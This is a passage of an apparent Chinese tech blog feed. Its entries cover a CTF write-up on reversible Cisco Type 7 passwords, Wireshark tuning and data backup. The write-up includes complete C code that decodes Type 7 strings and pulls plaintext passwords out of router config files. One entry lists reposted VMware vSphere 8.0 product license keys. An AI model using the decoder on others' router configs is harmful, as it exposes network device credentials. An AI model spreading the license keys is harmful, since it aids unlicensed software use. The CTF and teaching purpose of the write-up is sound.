        <content type="html"><![CDATA[<h1 id="ctf-show-类型-7-wp">CTF-Show 类型-7 WP</h1><h2 id="题目描述">题目描述</h2><p>flag格式为 ctfshow{明文}</p><pre class="line-numbers language-none"><code class="language-none">094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="tldr">TL;DR</h2><p>本质上是思科路由器和安全设备的一种密码加密方式，由于可以被反向解密，已经被deprecated 且不被推荐使用。</p><h2 id="题解">题解</h2><p>解密 Link： - https://www.bejson.com/encrypt/type7_decode/ -http://web.chacuo.net/safeciscotype7 -http://www.atoolbox.net/Tool.php?Id=992</p><p>btw, <a href="https://insecure.org/sploits/cisco.passwords.html">insecure.org/sploits/cisco.passwords</a>处代码有误，我在 <a href="https://github.com/sfc9982/Cisco-Type-7-Password-Decoder">github.com/sfc9982/Cisco-Type-7-Password-Decoder</a>中修复了它，已向作者反馈。</p><p>有关思科的各种密码加密方案，可以参考 NSA 的文章 <em>Cisco PasswordTypes: Best Practices</em></p><p>给我们的启发就是生产环境中的加密方案也不一定安全</p><h3 id="代码">代码</h3><p><code>cdecrypt()</code>中的迭代方式和数据类型的处理很啰嗦，有时间优化一下。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;strings.h&gt;</span></span><span class="token keyword">char</span> xlat<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"</span><span class="token punctuation">;</span><span class="token keyword">char</span> pw_str1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">" password 7 "</span><span class="token punctuation">;</span><span class="token keyword">char</span> pw_str2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"enable password 7 "</span><span class="token punctuation">;</span><span class="token keyword">char</span> pw_str3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ip ftp password 7 "</span><span class="token punctuation">;</span><span class="token keyword">char</span> pw_str4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">" ip ospf message-digest-key 1 md5 7 "</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>pname<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cdecrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>enc_pw<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>dec_pw<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">,</span> i<span class="token punctuation">,</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    seed <span class="token operator">=</span> <span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> enc_pw<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>seed <span class="token operator">&gt;</span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isdigit</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isdigit</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dec_pw<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">^</span> xlat<span class="token punctuation">[</span>seed<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        val <span class="token operator">*=</span> <span class="token number">16</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">toupper</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            val <span class="token operator">+=</span> enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token char">'F'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            val <span class="token operator">+=</span> enc_pw<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>enc_pw<span class="token punctuation">)</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    dec_pw<span class="token punctuation">[</span><span class="token operator">++</span>i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"Usage: %s -p &lt;encrypted password&gt;\n"</span><span class="token punctuation">,</span> pname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"       %s &lt;router config file&gt; &lt;output file&gt;\n"</span><span class="token punctuation">,</span> pname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>    FILE <span class="token operator">*</span>in <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token operator">*</span>out <span class="token operator">=</span> <span class="token constant">stdout</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> passwd<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> pw_pos<span class="token punctuation">;</span>    pname <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token char">'h'</span><span class="token operator">:</span>                    <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token char">'p'</span><span class="token operator">:</span>                    <span class="token function">memset</span><span class="token punctuation">(</span>passwd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdecrypt</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Error.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"password: %s\n"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token operator">:</span>                    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s: unknow option."</span><span class="token punctuation">,</span> pname<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>in <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>out <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"wt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token function">fclose</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">fclose</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\r'</span><span class="token punctuation">)</span>                i<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        pw_pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        line<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> pw_str1<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            pw_pos <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> pw_str2<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            pw_pos <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> pw_str3<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            pw_pos <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> pw_str4<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            pw_pos <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// if (!pw_pos)</span>        <span class="token comment">// {</span>        <span class="token comment">//     fprintf(stdout, "%s\n", line);</span>        <span class="token comment">//     continue;</span>        <span class="token comment">// }</span>        <span class="token function">memset</span><span class="token punctuation">(</span>passwd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdecrypt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>line<span class="token punctuation">[</span>pw_pos<span class="token punctuation">]</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Error.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pw_pos <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str1<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">fprintf</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> pw_str1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pw_pos <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str2<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">fprintf</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> pw_str2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pw_pos <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str3<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">fprintf</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> pw_str3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pw_pos <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pw_str4<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">fprintf</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> pw_str4<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware vSphere (ESXi) 8.0 许可证</title>
      <link href="/2022/11/13/vmware-vsphere-esxi-8-0-xu-ke-zheng/"/>
      <url>/2022/11/13/vmware-vsphere-esxi-8-0-xu-ke-zheng/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware-vsphere-esxi-8.0-许可证">VMware vSphere (ESXi) 8.0许可证</h1><h2 id="esxi">ESXi</h2><p>4V492-44210-48830-931GK-2PRJ4 HG00K-03H8K-48929-8K1NP-3LUJ44F40H-4ML1K-M89U0-0C2N4-1AKL4</p><h2 id="vcenter-server">vCenter Server</h2><p>0Z20K-07JEH-08030-908EP-1CUK4 4F282-0MLD2-M8869-T89G0-CF2400F41K-0MJ4H-M88U1-0C3N0-0A214</p><h2 id="vsan">vSAN</h2><p>NF212-08H0K-488X8-WV9X6-1F024 JF61H-48K8K-488X9-W98Z0-1FH24</p><h2 id="horizon-enterprise">Horizon Enterprise</h2><p>0G4DA-49J81-M80R1-012N4-86KH4</p><p>（转载自：<a href="https://www.azurew.com/esxi-8-0/10097.html">www.azurew.com/esxi-8-0/10097</a>）</p>]]></content>
      
      
      
        <tags>
            
            <tag> VMware </tag>
            
            <tag> 虚拟化 </tag>
            
            <tag> ESXi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark高负载下的性能优化</title>
      <link href="/2022/11/11/wireshark-gao-fu-zai-xia-de-xing-neng-you-hua/"/>
      <url>/2022/11/11/wireshark-gao-fu-zai-xia-de-xing-neng-you-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Wireshark并未为性能所特地优化，主要是为了初学者和流量分析工程师分析流量特征和解析协议，但是鉴于其UI友好型，我在某核心网络流量镜像与分析的项目中也使用了Wireshark.</p><p>众所周知，Wireshark 将监听到但还未保存的数据文件全部存放于<code>/Temp</code>目录，同时将其装载到内存中作为快速缓存，I/O瓶颈显然会影响性能。</p><p>这里可以把临时目录挂载到内存盘（ramdisk）中，可以大幅提高解析等操作的速度。</p><p>接下来就是实时的数据处理，数据包类型的着色与高亮，DNS的反向查找，都会拖慢重新过滤的速度。</p><p>可以在高级设置中设置： - IP/Reassembled fragmented IP datagrams -TCP/Allow subdissectors to reassemble TCP streams</p><p>硬件方面，Wireshark 的任务处理采用单线程，多核的优势聊胜于无。</p><p>其他方面，可以参考：<a href="https://wiki.wireshark.org/Performance">wiki.wireshark.org/Performance</a></p><h2 id="从捕获过滤降低流量规模">从捕获过滤降低流量规模</h2><p>一般情况下，如果要过滤 POST包，需要在显示过滤器中过滤，在无人值守时，期间可能会发生内存溢出等情况。</p><p>使用捕获过滤器可以有效规避：</p><pre class="line-numbers language-none"><code class="language-none">port 80 and tcp[((tcp[12] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420'G', 'E', 'T', ' ' (16 进制值分别对应为 47, 45, 54, 20；tcp[12] &amp; 0xf0) &gt;&gt; 2 为数据偏移位，取 4 字节即为 GET 。0x504f5354 POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈个人数据备份方案</title>
      <link href="/2022/11/09/qian-tan-ge-ren-shu-ju-bei-fen-fang-an/"/>
      <url>/2022/11/09/qian-tan-ge-ren-shu-ju-bei-fen-fang-an/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈个人数据备份方案">浅谈个人数据备份方案</h1><h2 id="数据备份三二一原则">数据备份三二一原则</h2><ol type="1"><li>至少<strong>三个备份</strong></li></ol><p>除原有数据副本外，将重要数据（如您打了300小时的游戏存档，或赶工一星期明天要交的数据报表）额外再备份两份副本，以免一次意外（从硬盘进水到电脑被偷）就毁掉全部数据，多一份备份，多一分保险。</p><ol start="2" type="1"><li>两种<strong>不同形式</strong></li></ol><p>以至少两种不同的媒介存储数据副本，包括但不限于多块硬盘、固态硬盘、网盘云存储、服务器、DVD光盘、PMEM等。</p><ol start="3" type="1"><li>一块<strong>异地存储</strong></li></ol><p>至少将一份备份存储在异地。最简单的方法就是拿块移动硬盘，实验室一份宿舍一份，防火防盗不说，万一忙活时也不用着急跑去取数据了不是。</p><h2 id="我的数据咋会丢呢">我的数据咋会丢呢？</h2><blockquote><p>（笑），作为一名多次灾难性丢失重要数据的人，很有发言权。从物理上到逻辑上，数据有很多种丢失的可能，比如说你的硬盘大限将至，撒手人寰；或者系统升级后数据荡然无存；亦或是自己手残导致数据火葬场……</p></blockquote><p>总而言之，你的数据总是会丢的，当你赌它不会丢的时候，你已经输了。</p><h3 id="物理因素">物理因素</h3><p>在学校中，大家的存储介质无非就是：<strong>固态硬盘</strong>、<strong>机械硬盘</strong>、<strong>U盘</strong>这三种。</p><p>对于固态硬盘来说，大多正规的硬盘都有良好的品控，故障率极低。但是由于其微观性质，丢失数据后基本无法挽回。</p><p>机械硬盘相比来说有着较高的故障率（主要由于来回携带的振动和掉落等磕碰），但是丢失数据后还有拯救的余地。</p><p>U盘，坏了直接<strong>火葬场</strong>。这里大家要注意区分手中的U盘是不是常说的“量产U盘”（即华强北山寨品），其拥有着正品的外观，极低的可靠性和寿命，和故障之前毫无征兆的特性，非常不推荐使用，如何区分这里不深入讨论。</p><p>将重要数据存放至U盘前请确认其<strong>有备份</strong>。<strong>永远不要把U盘作为备份手段！</strong></p><h3 id="软件因素">软件因素</h3><p>这里举个例子，本文刚刚写作时，学校的代码平台发生了故障，代码悉数丢失，对于没有备份的同学是一件遗憾的事情。</p><p>或者是你在日常操作时手贱导致数据丢失，总之事故的原因五花八门。</p><h2 id="我该咋办呢">我该咋办呢？</h2><h3 id="对于轻量的代码文件">对于轻量的代码文件</h3><p>大家可以尝试使用 <a href="https://git-scm.com/">Git</a>.它是一个被称作<strong>分布式版本控制软件</strong>的东东，最初目的是为了更好地管理Linux内核开发而设计。可以用它来<strong>存储代码、跟踪修订历史记录、合并代码更改，并在需要时恢复为较早的代码版本</strong>。</p><p>可能有些晦涩，我来翻译一下，Git是：<strong>存代码的地，还能看之前啥样，还能看我之前改啥了，还有后悔药！</strong></p><h4 id="咋用呢">咋用呢？</h4><p>教程有很多：</p><ul><li><a href="https://www.runoob.com/git/git-basic-operations.html">Runoob</a></li><li><a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-Git-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">Git-SCM</a></li></ul><p>不熟悉 CLI 操作的同学可以尝试 Github Desktop, Sublime Merge等工具，这里不再赘述其使用方法。</p><p>通过 Git，我可以单靠 <code>git clone</code>这一个命令，在代码平台和本地代码全部丢失的情况下，在一分钟内，迅速重建代码目录以及对应的目录结构。</p><h3 